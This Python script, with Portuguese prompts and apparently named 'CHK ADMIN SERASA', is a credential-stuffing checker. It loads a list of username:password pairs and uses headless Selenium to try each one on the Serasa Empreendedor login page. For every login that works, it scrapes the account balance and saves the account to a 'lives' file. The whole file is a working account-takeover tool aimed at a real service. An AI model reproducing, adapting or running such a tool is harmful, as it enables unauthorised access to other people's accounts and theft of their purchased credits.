import os
import time
import tkinter as tk
from tkinter import filedialog, messagebox
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from colorama import Fore, Style

class Authenticator:
    def __init__(self):
        self.live_accounts = []

    def iniciar_programa(self):
        """Inicia o programa e exibe o menu."""
        print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "==============================")
        print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "   CHK ADMIN SERASA")
        print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "==============================")
        print(Fore.LIGHTCYAN_EX + "1. Iniciar teste de credenciais")
        print(Fore.LIGHTCYAN_EX + "2. Sair")
        print(Fore.LIGHTMAGENTA_EX + "==============================")
        
        opcao = input(Fore.LIGHTYELLOW_EX + "Escolha uma opção: ")

        if opcao == '1':
            self.selecionar_arquivo()
        elif opcao == '2':
            print(Fore.LIGHTGREEN_EX + "Saindo do programa...")
            exit()
        else:
            print(Fore.RED + "Opção inválida. Tente novamente.")
            self.iniciar_programa()

    def selecionar_arquivo(self):
        """Abre uma janela para selecionar o arquivo de credenciais."""
        arquivo = filedialog.askopenfilename(title="Selecione o arquivo de credenciais", filetypes=[("Text files", "*.txt")])

        if arquivo:
            self.carregar_e_validar_credenciais(arquivo)
        else:
            print(Fore.RED + "Nenhum arquivo selecionado.")
            self.iniciar_programa()

    def carregar_e_validar_credenciais(self, arquivo):
        """Carrega e valida as credenciais do arquivo selecionado, removendo duplicatas e mantendo a ordem."""
        with open(arquivo, 'r', encoding='utf-8') as f:
            credenciais = f.readlines()

        # Conjunto para rastrear credenciais únicas
        credenciais_vistas = set()
        credenciais_validas = []

        for linha in credenciais:
            linha = linha.strip()  # Remove espaços em branco
            if linha and ':' in linha:  # Verifica se a linha não está vazia e contém ':'
                if linha not in credenciais_vistas:  # Verifica se a linha já foi vista
                    credenciais_validas.append(linha)  # Adiciona à lista de credenciais válidas
                    credenciais_vistas.add(linha)  # Marca a linha como vista

        if not credenciais_validas:
            print(Fore.RED + "Nenhuma credencial válida encontrada.")
            return

        print(Fore.GREEN + f"{len(credenciais_validas)} credenciais válidas encontradas.")
        self.testar_credenciais(credenciais_validas)

    def testar_credenciais(self, credenciais_validas):
        """Testa as credenciais contidas na lista de credenciais válidas."""
        # Processa as credenciais em lotes para evitar sobrecarga de memória
        batch_size = 1000  # Ajuste conforme necessário
        credenciais_lista = list(credenciais_validas)

        for i in range(0, len(credenciais_lista), batch_size):
            batch = credenciais_lista[i:i + batch_size]
            for linha in batch:
                usuario, senha = linha.split(':', 1)  # Divide em no máximo 2 partes
                self.usar_selenium(usuario, senha)

        print(Fore.CYAN + Style.BRIGHT + "==============================")
        print(Fore.CYAN + Style.BRIGHT + "Teste de credenciais concluído.")

    def usar_selenium(self, usuario, senha):
        """Usa o Selenium para autenticação na nova URL."""
        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--log-level=3")
        options.add_argument("--silent")

        if os.name == 'nt':
            options.add_argument("--log-path=NUL")

        driver = webdriver.Chrome(options=options)

        print(Fore.CYAN + Style.BRIGHT + "🔐 Conexão estabelecida com o servidor. Código em execução. 💻")

        driver.get('https://www.serasaempreendedor.com.br/login')

        print(Fore.CYAN + Style.BRIGHT + "==============================")
        print(Fore.CYAN + Style.BRIGHT + f"🌐 Conectando ao Portal Serasa. Autenticando login {usuario} 🔍")

        username_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'username'))
        )
        password_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'password'))
        )
        login_button = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'btn-acessar'))
        )

        username_field.send_keys(usuario)
        password_field.send_keys(senha)
        login_button.click()

        time.sleep(5)  # Aguarde um pouco para que a página carregue

        if "Bem-vindo ao Nosso Tour!" in driver.page_source or \
           "Comprar créditos" in driver.page_source:
            print(Fore.GREEN + f"✅ PAINEL AUTENTICADO com sucesso para: {usuario} ✅")

            try:
                saldo_element = driver.find_element(By.CLASS_NAME, 'value')
                saldo = saldo_element.text if saldo_element else "Saldo não encontrado"
                
                # Exibir saldo em um formato organizado
                print(Fore.CYAN + "==============================")
                print(Fore.CYAN + f"🪙 Saldo disponível: {saldo}")
                
                # Salvar informações em lives_serasa.txt
                self.salvar_resultados(usuario, saldo)

            except Exception as e:
                print(Fore.RED + "Erro ao buscar saldo: " + str(e))

        elif "Verifique se o usuário ou senha foram digitados corretamente" in driver.page_source:
            print(Fore.RED + f"❌ USUÁRIO INCORRETO para {usuario} ❌")
        else:
            print(Fore.RED + f"❌ Status indefinido para {usuario} ❌")

        print(Fore.CYAN + Style.BRIGHT + "==============================")
        driver.quit()

    def salvar_resultados(self, usuario, saldo):
        """Salva os resultados encontrados em um arquivo."""
        with open('lives_serasa.txt', 'a', encoding='utf-8') as f:
            f.write(f"{usuario}|{saldo}\n")  # Usando "|" como separador
        print(Fore.GREEN + f"✅ Resultado salvo com sucesso! Usuário: {usuario} | {saldo}")

# Para executar o programa
if __name__ == "__main__":
    auth = Authenticator()
    auth.iniciar_programa()
